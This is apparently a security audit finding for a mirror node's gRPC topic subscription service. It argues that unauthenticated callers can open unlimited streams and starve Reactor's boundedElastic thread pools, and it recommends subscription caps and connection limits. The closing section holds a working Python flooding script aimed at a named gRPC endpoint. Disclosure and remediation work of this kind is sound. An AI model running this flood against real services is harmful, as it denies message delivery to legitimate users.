### Title
Unbounded Concurrent gRPC Subscriptions Exhaust `boundedElastic` Scheduler, Stalling Live Message Delivery for All Subscribers

### Summary
`subscribeTopic()` accepts an unlimited number of concurrent subscriptions from unauthenticated callers. Each subscription allocates work items on one or more `Schedulers.boundedElastic()` thread pools (global and per-bean instances), which have a hard thread cap of `10 × CPU cores`. An attacker opening enough connections — each carrying up to 5 streams — saturates these pools, causing legitimate subscribers' live message pipelines to stall indefinitely and transactions to never be delivered to them.

### Finding Description

**Code locations and root cause:**

`GrpcConfiguration.java` configures the Netty server with only a per-connection call limit:

```java
// GrpcConfiguration.java:33
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

`NettyProperties.java:14` sets this to `5` by default. There is no limit on the number of connections, no authentication, and no global subscription cap. An attacker with N connections gets `5N` concurrent subscriptions.

**Exploit chain through `subscribeTopic()`:**

Every call to `TopicMessageServiceImpl.subscribeTopic()` (lines 58–92) creates:

1. **A `safetyCheck` flux** (line 67–70) that calls `subscribeOn(Schedulers.boundedElastic())` — the global shared pool — for every subscription:
   ```java
   Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
       .filter(_ -> !topicContext.isComplete())
       .flatMapMany(_ -> missingMessages(topicContext, null))
       .subscribeOn(Schedulers.boundedElastic());  // global pool, one task per subscriber
   ```

2. **A live message pipeline** via `incomingMessages()` → `topicListener.listen()` → `SharedTopicListener.listen()` (line 25), which calls `publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch())` for **every subscriber**:
   ```java
   // SharedTopicListener.java:25
   .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
   ```
   This is the global shared `Schedulers.boundedElastic()` instance. Every subscriber's message delivery is dispatched through this pool.

3. **For `POLL` listener type**, `PollingTopicListener` (line 31) creates its own `Schedulers.boundedElastic()` instance and schedules each subscriber's polling loop on it:
   ```java
   // PollingTopicListener.java:31
   private final Scheduler scheduler = Schedulers.boundedElastic();
   // ...
   return Flux.defer(() -> poll(context))
       .delaySubscription(interval, scheduler)   // thread per subscriber
       .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
           .withFixedDelay(interval)
           .withScheduler(scheduler));            // recurring thread per subscriber
   ```

4. **`PollingTopicMessageRetriever`** (line 41) creates yet another `Schedulers.boundedElastic()` instance used for every historical retrieval per subscription.

**Why the per-connection limit fails:**

`maxConcurrentCallsPerConnection = 5` only limits streams per TCP connection. An attacker opens `C` connections, each with 5 streams, yielding `5C` total subscriptions. There is no server-side enforcement of a global subscription ceiling. The `subscriberCount` metric (line 89) is observability-only and enforces nothing.

**Thread pool exhaustion:**

Reactor's `Schedulers.boundedElastic()` caps threads at `10 × Runtime.getRuntime().availableProcessors()`. On a 4-core pod (typical Kubernetes resource limit), that is 40 threads. With `5C > 40` attacker subscriptions all simultaneously triggering `publishOn` dispatch (e.g., during a message burst), the pool is saturated. Legitimate subscribers' `publishOn` tasks are queued behind attacker tasks, stalling live message delivery. If the task queue (100,000 items) also fills, `RejectedExecutionException` is thrown, terminating legitimate subscriber streams.

### Impact Explanation

Live topic message streams for legitimate subscribers stall or terminate. Since the mirror node's gRPC `subscribeTopic` is the mechanism by which clients receive `ConsensusSubmitMessage` transactions in real time, saturation of the delivery scheduler means those transactions are never gossiped to waiting clients. This is a complete denial-of-service against the live subscription path, achievable without any credentials or special network position.

### Likelihood Explanation

The attack requires only the ability to open TCP connections to port 5600 (publicly exposed per the Helm chart and docker-compose). No authentication, API key, or account is required. The attacker needs `ceil(threadCap / 5)` connections — on a 4-core pod, just 8 connections (40 streams) suffice to saturate the global `boundedElastic` pool during a message burst. This is trivially scriptable with any gRPC client library. The attack is repeatable and persistent as long as the attacker holds the connections open.

### Recommendation

1. **Enforce a global concurrent-subscription limit** in `TopicMessageServiceImpl.subscribeTopic()` using the existing `subscriberCount` `AtomicLong` — reject new subscriptions when the count exceeds a configurable threshold (e.g., return `RESOURCE_EXHAUSTED` status).
2. **Add a per-IP or per-connection subscription rate limit** via a gRPC `ServerInterceptor`.
3. **Use a dedicated, bounded `Scheduler` with a fixed thread pool** for `SharedTopicListener.publishOn()` instead of the global `Schedulers.boundedElastic()`, so attacker subscriptions cannot starve the global pool used by other reactive pipelines.
4. **Configure `maxConnectionAge` and `maxConnectionIdle`** on the `NettyServerBuilder` in `GrpcConfiguration` to limit how long an attacker can hold connections open.
5. **Add `maxConnections`** at the Netty level or via an ingress/proxy rule to cap total simultaneous TCP connections.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto import timestamp_pb2, basic_types_pb2

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 20   # 20 connections × 5 streams = 100 subscriptions

def flood_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        # no endTime, no limit → infinite subscription
    )
    streams = []
    for _ in range(5):  # maxConcurrentCallsPerConnection = 5
        streams.append(stub.subscribeTopic(query))
    # Hold streams open indefinitely
    for s in streams:
        try:
            for _ in s:
                pass
        except Exception:
            pass

threads = [threading.Thread(target=flood_connection, args=(i,)) for i in range(CONNECTIONS)]
for t in threads:
    t.start()

# At this point, 100 concurrent subscriptions are open.
# Each holds a slot in Schedulers.boundedElastic().
# Legitimate subscriber streams now stall waiting for a thread.
```

**Expected result:** Legitimate clients subscribing after the flood experience no message delivery (stalled `publishOn` queue). On a 4-core pod, as few as 8–10 attacker connections are sufficient to observe measurable delivery latency degradation. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-34)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L67-70)
```java
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L88-90)
```java
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java (L21-25)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        return getSharedListener(filter)
                .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
                .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
                .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L31-48)
```java
    private final Scheduler scheduler = Schedulers.boundedElastic();

    @Override
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L34-42)
```java
    public PollingTopicMessageRetriever(
            ObservationRegistry observationRegistry,
            RetrieverProperties retrieverProperties,
            TopicMessageRepository topicMessageRepository) {
        this.observationRegistry = observationRegistry;
        this.retrieverProperties = retrieverProperties;
        this.topicMessageRepository = topicMessageRepository;
        scheduler = Schedulers.boundedElastic();
    }
```
